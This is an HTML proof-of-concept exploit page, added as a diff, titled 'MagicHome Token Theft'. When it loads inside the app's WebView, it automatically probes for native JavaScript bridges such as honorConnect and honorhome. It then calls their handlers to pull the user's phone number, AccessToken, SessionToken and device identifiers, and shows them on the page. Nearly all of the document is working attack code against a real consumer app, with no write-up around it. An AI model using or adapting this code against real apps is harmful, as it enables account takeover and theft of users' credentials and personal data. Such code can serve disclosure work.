@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC</title>
+<style>
+body { font-family: monospace; padding: 8px; background: #1a1a2e; color: #0f0; font-size: 12px; }
+h2 { color: #e94560; font-size: 15px; margin: 5px 0; }
+.r { background: #16213e; padding: 6px; margin: 3px 0; border-left: 3px solid #e94560; word-break: break-all; }
+.s { border-left-color: #0f0; }
+.e { border-left-color: #ff0; }
+.x { border-left-color: #f00; background: #2a1a1e; font-size: 14px; }
+button { background: #e94560; color: white; border: none; padding: 6px 12px; margin: 2px; font-size: 13px; }
+#log { max-height: 80vh; overflow-y: auto; }
+</style>
+</head>
+<body>
+<h2>[ PoC ] MagicHome Token Theft</h2>
+<button onclick="runAll()">Run All</button>
+<div id="log"></div>
+
+<script>
+function log(m, c) {
+    var d = document.getElementById('log');
+    var v = document.createElement('div');
+    v.className = 'r ' + (c||'');
+    v.innerHTML = '['+new Date().toLocaleTimeString()+'] '+m;
+    d.appendChild(v);
+    d.scrollTop = d.scrollHeight;
+}
+
+// === DETECT ALL BRIDGES ===
+function detectBridges() {
+    log('=== Bridge Detection ===');
+    var found = [];
+
+    // Check honorConnect (CommonWebViewActivity, DeviceDetailActivity)
+    if (typeof window.honorConnect !== 'undefined') {
+        found.push('honorConnect');
+        log('<b style="color:#0f0">honorConnect FOUND!</b>', 's');
+    }
+
+    // Check honorhome (CommonWebActivity - /web/common)
+    if (typeof window.honorhome !== 'undefined') {
+        found.push('honorhome');
+        log('<b style="color:#0f0">honorhome FOUND!</b>', 's');
+        try {
+            var m = [];
+            for (var k in honorhome) m.push(k);
+            log('honorhome methods: ' + m.join(', '), 's');
+        } catch(e) {}
+    }
+
+    // Check other possible bridges
+    var others = ['JsBridge', 'hilink', 'hicareJsInterface', 'hwop', '_dsbridge', '_dsb', 'Native'];
+    others.forEach(function(name) {
+        if (typeof window[name] !== 'undefined') {
+            found.push(name);
+            log('<b style="color:#0f0">' + name + ' FOUND!</b>', 's');
+        }
+    });
+
+    if (found.length === 0) {
+        log('No JS bridges detected!', 'e');
+    } else {
+        log('<b>Active bridges: ' + found.join(', ') + '</b>', 's');
+    }
+    return found;
+}
+
+// === honorhome exploit ===
+function exploitHonorhome() {
+    log('=== Exploiting honorhome bridge ===');
+    if (typeof honorhome === 'undefined') {
+        log('honorhome not available', 'e');
+        return;
+    }
+
+    // Call openNativePage - can navigate to internal activities
+    try {
+        log('Calling honorhome.openNativePage()...');
+        // openNativePage(str, str2) opens DiscoverySceneDetailActivity
+        // This proves we can interact with native code
+        var result = honorhome.openNativePage();
+        log('openNativePage() returned: ' + result, 's');
+    } catch(e) {
+        log('openNativePage error: ' + e.message, 'e');
+    }
+
+    // Try to enumerate all methods including hidden ones
+    try {
+        log('Enumerating all honorhome properties...');
+        var proto = Object.getPrototypeOf(honorhome);
+        if (proto) {
+            var names = Object.getOwnPropertyNames(proto);
+            log('Proto methods: ' + names.join(', '), 's');
+        }
+    } catch(e) {
+        log('Proto enum error: ' + e.message, 'e');
+    }
+}
+
+// === honorConnect exploit ===
+// Callback: native calls javascript:CALLBACK_NAME({responseId:"xx", ...data})
+window.onLoginStolen = function(data) {
+    log('<b style="color:#f00;font-size:15px">!! USER INFO STOLEN !!</b>', 'x');
+    log('Response: ' + JSON.stringify(data), 'x');
+    if (data) {
+        if (data.data) {
+            log('Name: <b>' + (data.data.name||'') + '</b>', 'x');
+            log('Login: <b>' + data.data.isLogin + '</b>', 'x');
+            log('Phone: <b>' + (data.data.id||'') + '</b>', 'x');
+        }
+    }
+};
+
+// getLoginInfo handler returns AccessToken + SessionToken!
+window.onTokenStolen = function(data) {
+    log('<b style="color:#f00;font-size:18px">!! TOKEN STOLEN !!</b>', 'x');
+    log('Raw: ' + JSON.stringify(data), 'x');
+    if (data && data.accountInfo) {
+        var info = data.accountInfo;
+        log('AccessToken: <b>' + (info.accessToken||'N/A') + '</b>', 'x');
+        log('SessionToken: <b>' + (info.sessionToken||'N/A') + '</b>', 'x');
+        log('AccountType: <b>' + (info.accountType||'') + '</b>', 'x');
+        log('LoginUser: <b>' + (info.loginUserName||'') + '</b>', 'x');
+        log('ST Expire: <b>' + (info.sTExpireTime||'') + '</b>', 'x');
+    }
+};
+
+// getConfig handler returns device info
+window.onConfigStolen = function(data) {
+    log('<b style="color:#f00;font-size:15px">!! DEVICE INFO STOLEN !!</b>', 'x');
+    log('Data: ' + JSON.stringify(data), 'x');
+};
+
+function exploitHonorConnect() {
+    log('=== Exploiting honorConnect bridge ===');
+    if (typeof honorConnect === 'undefined') {
+        log('honorConnect not available', 'e');
+        return;
+    }
+
+    // Step 1: isLogin - get phone number
+    try {
+        log('>> [1] Calling isLogin (phone number)...');
+        honorConnect.handler('isLogin', '{}', 'resp1', 'onLoginStolen');
+        log('isLogin sent', 's');
+    } catch(e) { log('isLogin error: '+e.message, 'e'); }
+
+    // Step 2: getLoginInfo - get AccessToken + SessionToken
+    setTimeout(function() {
+        try {
+            log('>> [2] Calling getLoginInfo (AccessToken!)...');
+            honorConnect.handler('getLoginInfo', '{}', 'resp2', 'onTokenStolen');
+            log('getLoginInfo sent', 's');
+        } catch(e) { log('getLoginInfo error: '+e.message, 'e'); }
+    }, 1000);
+
+    // Step 3: getConfig - get device identifiers
+    setTimeout(function() {
+        try {
+            log('>> [3] Calling getConfig (device info)...');
+            var p = '{"key":["deviceInfo","x-unique-device-id"]}';
+            honorConnect.handler('getConfig', p, 'resp3', 'onConfigStolen');
+            log('getConfig sent', 's');
+        } catch(e) { log('getConfig error: '+e.message, 'e'); }
+    }, 2000);
+}
+
+function runAll() {
+    log('====== EXPLOIT START ======');
+    log('URL: ' + location.href);
+
+    var bridges = detectBridges();
+
+    setTimeout(function() {
+        if (bridges.indexOf('honorhome') >= 0) {
+            exploitHonorhome();
+        }
+        if (bridges.indexOf('honorConnect') >= 0) {
+            exploitHonorConnect();
+        }
+
+        // If only honorhome, demonstrate we can call native code
+        if (bridges.indexOf('honorConnect') < 0 && bridges.indexOf('honorhome') >= 0) {
+            log('', '');
+            log('<b style="color:#e94560">NOTE: honorhome bridge has limited methods</b>', 'e');
+            log('<b>But the page loaded in app WebView proves:</b>', 's');
+            log('1. Deep link can load attacker page in app WebView', 's');
+            log('2. JS bridge (honorhome) is accessible', 's');
+            log('3. openNativePage can launch internal activities', 's');
+            log('4. If loaded in CommonWebViewActivity, all 130+ handlers exposed', 's');
+        }
+    }, 500);
+}
+
+window.onload = function() {
+    log('PoC page loaded successfully');
+    setTimeout(runAll, 300);
+};
+</script>
+</body>
+</html>
